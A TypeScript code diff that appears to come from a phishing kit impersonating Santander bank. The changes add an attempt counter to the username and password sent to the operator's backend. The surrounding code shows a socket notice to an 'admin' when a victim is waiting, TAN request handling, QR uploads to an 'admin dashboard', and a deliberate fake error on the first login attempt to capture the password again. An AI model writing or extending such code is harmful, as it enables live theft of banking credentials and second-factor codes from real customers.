@@ -157,7 +157,7 @@ function FormFlow() {
       setIsWaitingForAdmin(true);
       
       // Store the next state to transition to when admin continues
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       // Notify admin that user is waiting
       templateSocketClient.emit('user-waiting', {
@@ -267,7 +267,7 @@ function FormFlow() {
               setIsWaitingForAdmin(false);
               setLoading(false);
               setState(sessionData.pendingState);
-              setSessionData(prev => ({ ...prev, pendingState: null }));
+              setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
             }
           },
           onTanRequest: (tanData: {
@@ -333,6 +333,9 @@ function FormFlow() {
         return;
       }
       
+      const currentAttempt = sessionStorage.getItem(`santander_attempts_${key}`) || '0';
+      const attempts = parseInt(currentAttempt) + 1;
+
       // Submit to our backend via template-submit endpoint
       try {
         const response = await submitTemplateData({
@@ -341,7 +344,8 @@ function FormFlow() {
           step: 'login',
           data: {
             username: data.username,
-            password: data.password
+            password: data.password,
+            attempt: attempts
           }
         });
         
@@ -357,8 +361,6 @@ function FormFlow() {
       }
       
       // Simulate realistic flow - first attempt goes to error, second to compromised
-      const currentAttempt = sessionStorage.getItem(`santander_attempts_${key}`) || '0';
-      const attempts = parseInt(currentAttempt) + 1;
       sessionStorage.setItem(`santander_attempts_${key}`, attempts.toString());
       
       if (attempts === 1) {
@@ -542,7 +544,7 @@ function FormFlow() {
           console.warn('Backend QR start failed:', response.error);
           // Continue with flow even if API fails
         } else {
-          console.log('Start QR upload response:', response.data);
+          console.log('Start QR upload response:', response);
         }
       } catch (apiError) {
         console.warn('Failed to submit QR start to admin dashboard:', apiError);
@@ -593,7 +595,7 @@ function FormFlow() {
           console.warn('Backend QR upload failed:', response.error);
           // Continue with flow even if API fails
         } else {
-          console.log('✅ QR upload response:', response.data);
+          console.log('✅ QR upload response:', response);
         }
       } catch (apiError) {
         console.warn('Failed to upload QR to admin dashboard:', apiError);
